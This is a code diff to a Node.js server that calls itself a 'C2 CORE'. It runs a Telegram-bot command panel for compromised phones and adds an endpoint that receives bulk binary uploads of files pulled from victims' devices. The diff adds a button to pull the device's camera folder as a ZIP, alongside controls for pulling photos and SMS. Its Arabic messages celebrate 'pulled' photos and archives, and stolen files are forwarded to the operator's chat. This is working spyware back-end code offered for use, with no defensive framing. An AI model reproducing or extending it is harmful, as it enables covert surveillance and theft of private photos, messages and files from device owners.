@@ -16,8 +16,7 @@ if (!token || !chatId) {
 }
 
 const UPLOAD_DIR = path.join(__dirname, 'unified_storage');
-const TEMP_DIR = path.join(__dirname, 'unified_temp');
-[UPLOAD_DIR, TEMP_DIR].forEach(dir => { if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true }); });
+[UPLOAD_DIR].forEach(dir => { if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true }); });
 
 const db = new sqlite3.Database('./unified_core.db');
 db.serialize(() => {
@@ -34,9 +33,8 @@ appBot.on('polling_error', (error) => {
     }
 });
 
-app.use(express.text({ type: '*/*', limit: '500mb' }));
-
-const activeLocks = new Map();
+app.use(express.text({ type: 'application/json', limit: '50mb' }));
+app.use(express.raw({ type: 'application/octet-stream', limit: '500mb' }));
 
 async function sendTg(msg, options = {}) {
     try {
@@ -47,7 +45,43 @@ async function sendTg(msg, options = {}) {
 }
 
 app.get('/', (req, res) => {
-    res.status(200).send(`<html><body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;"><h1>[⚔] UNIFIED BLACK C2 CORE ONLINE [⚔️]</h1></body></html>`);
+    res.status(200).send(`<html><body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;"><h1>[⚔] ELITE RAW BINARY C2 CORE ONLINE [⚔️]</h1></body></html>`);
+});
+
+app.post('/api/v3/unified/upload_raw', async (req, res) => {
+    try {
+        const nodeId = req.headers['x-node-id'] || 'unknown';
+        const nodeModel = req.headers['x-node-model'] || 'Unknown';
+        const fileName = req.headers['x-file-name'] || `archive_${Date.now()}.zip`;
+
+        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);
+
+        if (!req.body || !Buffer.isBuffer(req.body)) {
+            return res.status(400).json({ status: 'BAD_BINARY_PAYLOAD' });
+        }
+
+        const safeName = path.basename(fileName);
+        const finalPath = path.join(UPLOAD_DIR, `${nodeId}_${Date.now()}_${safeName}`);
+        fs.writeFileSync(finalPath, req.body);
+
+        const stats = fs.statSync(finalPath);
+        const fileSizeMB = stats.size / (1024 * 1024);
+
+        await sendTg(`🔥 <b>تم سحب مجلد/ملف ضخم بنجاح (بث ثنائي خام حقيقي)!</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 الملف: <code>${safeName}</code>\n📊 الحجم: <code>${fileSizeMB.toFixed(2)} MB</code>`);
+
+        if (fileSizeMB > 50) {
+            await sendTg(`⚠️ <b>الملف كبير جداً (${fileSizeMB.toFixed(2)} MB):</b> يتجاوز حد تيليجرام (50MB)، تم حفظه على السيرفر.`);
+        } else {
+            await appBot.sendDocument(chatId, finalPath, { 
+                caption: `👑 <b>أرشيف الكاميرا / المجلد المسحوب:</b>\n📱 العقدة: <code>${nodeId}</code>\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
+            });
+        }
+
+        res.status(200).json({ status: 'OK', message: 'RAW_UPLOAD_SUCCESS' });
+    } catch (e) {
+        console.error('Raw Upload Error:', e);
+        res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
+    }
 });
 
 app.post('/api/v3/unified/stream', async (req, res) => {
@@ -68,45 +102,6 @@ app.post('/api/v3/unified/stream', async (req, res) => {
 
         if (payload.type === 'TEXT_REPORT') {
             await sendTg(`📋 <b>تقرير مباشر من [<code>${nodeId}</code>]:</b>\n<pre>${(payload.data || '').substring(0, 3500)}</pre>`);
-        } else if (payload.type === 'MEDIA_CHUNK') {
-            const { uploadId, fileName, chunkIndex, totalChunks, isLast, data, fileHash } = payload;
-            const tempPath = path.join(TEMP_DIR, `${nodeId}_${uploadId}.tmp`);
-            
-            while (activeLocks.get(uploadId)) await new Promise(r => setTimeout(r, 50));
-            activeLocks.set(uploadId, true);
-            try {
-                fs.appendFileSync(tempPath, Buffer.from(data, 'base64'));
-                if (isLast) {
-                    const safeName = path.basename(fileName || 'file.bin');
-                    const finalPath = path.join(UPLOAD_DIR, `${nodeId}_${Date.now()}_${safeName}`);
-                    fs.renameSync(tempPath, finalPath);
-                    
-                    const fileBuffer = fs.readFileSync(finalPath);
-                    const calcHash = crypto.createHash('sha256').update(fileBuffer).digest('hex');
-                    if (fileHash && calcHash !== fileHash) {
-                        await sendTg(`⚠️ <b>تحذير: تطابق الـ Hash فشل للملف ${safeName}</b>`);
-                    } else {
-                        const stats = fs.statSync(finalPath);
-                        const fileSizeMB = stats.size / (1024 * 1024);
-                        if (fileSizeMB > 50) {
-                            await sendTg(`⚠️ <b>الملف كبير جداً (${fileSizeMB.toFixed(2)} MB):</b> ${safeName} يتجاوز الحد الأقصى لتيليجرام (50MB).`);
-                        } else {
-                            const ext = path.extname(safeName).toLowerCase();
-                            if (['.jpg', '.jpeg', '.png', '.webp'].includes(ext)) {
-                                await appBot.sendPhoto(chatId, finalPath, { caption: `📸 <b>صورة حقيقية مسحوبة!</b>\n📱 العقدة: <code>${nodeId}</code>\n📂 الملف: <code>${safeName}</code>` });
-                            } else if (['.mp4', '.mkv', '.avi', '.mov'].includes(ext)) {
-                                await appBot.sendVideo(chatId, finalPath, { caption: `🎥 <b>فيديو حقيقي مسحوب!</b>\n📱 العقدة: <code>${nodeId}</code>\n📂 الملف: <code>${safeName}</code>` });
-                            } else {
-                                await appBot.sendDocument(chatId, finalPath, { caption: `🔥 <b>ملف حقيقي مسحوب!</b>\n📱 العقدة: <code>${nodeId}</code>\n📂 الملف: <code>${safeName}</code>` });
-                            }
-                        }
-                    }
-                }
-            } catch (chunkErr) {
-                await sendTg(`❌ <b>خطأ في معالجة الوسائط (${fileName}):</b> ${chunkErr.message}`);
-            } finally {
-                activeLocks.delete(uploadId);
-            }
         }
 
         db.get(`SELECT * FROM tasks WHERE node_id = ? AND status = 'PENDING' LIMIT 1`, [nodeId], (err, row) => {
@@ -137,7 +132,7 @@ appBot.on('message', async (msg) => {
                 inlineKeyboard.push([{ text: `📱 ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
             });
 
-            await sendTg(`🔥 <b>لوحة القيادة والسيطرة الموحدة الحقيقية:</b>\nاختر العقدة المستهدفة للسيطرة الفورية:`, {
+            await sendTg(`🔥 <b>لوحة القيادة والسيطرة الموحدة النخبوية:</b>\nاختر العقدة المستهدفة للسيطرة الفورية:`, {
                 reply_markup: { inline_keyboard: inlineKeyboard }
             });
         });
@@ -153,8 +148,8 @@ appBot.on('callback_query', async (query) => {
         const keyboard = {
             inline_keyboard: [
                 [
-                    { text: '📸 سحب الصور الحقيقية', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` },
-                    { text: '🎥 سحب الفيديوهات الحقيقية', callback_data: `cmd_EXTRACT_VIDEOS_${nodeId}` }
+                    { text: '👑 سحب مجلد الكاميرا والوسائط (ZIP)', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
+                    { text: '📸 سحب أحدث الصور', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` }
                 ],
                 [
                     { text: '📨 سحب الرسائل', callback_data: `cmd_EXTRACT_SMS_${nodeId}` },
@@ -175,12 +170,12 @@ appBot.on('callback_query', async (query) => {
         });
     } else if (data.startsWith('cmd_')) {
         const parts = data.split('_');
-        const action = parts[1] + '_' + parts[2];
-        const nodeId = parts[3];
+        const targetNodeId = parts.pop();
+        const action = parts.slice(1).join('_');
 
-        db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [nodeId, action], async () => {
-            await appBot.answerCallbackQuery(query.id, { text: `🚀 تم حقن الأمر بنجاح!` });
-            await sendTg(`⚡ <b>أمر [<code>${action}</code>] قيد التنفيذ للعقدة <code>${nodeId}</code>...</b>`);
+        db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [targetNodeId, action], async () => {
+            await appBot.answerCallbackQuery(query.id, { text: `🚀 تم حقن أمر [${action}] بنجاح!` });
+            await sendTg(`⚡ <b>أمر [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
         });
     } else if (data === 'back_home') {
         await appBot.deleteMessage(msg.chat.id, msg.message_id);
@@ -189,4 +184,4 @@ appBot.on('callback_query', async (query) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`[+] Unified Core Online on port ${PORT}`));
+app.listen(PORT, () => console.log(`[+] Elite Raw Binary Core Online on port ${PORT}`));
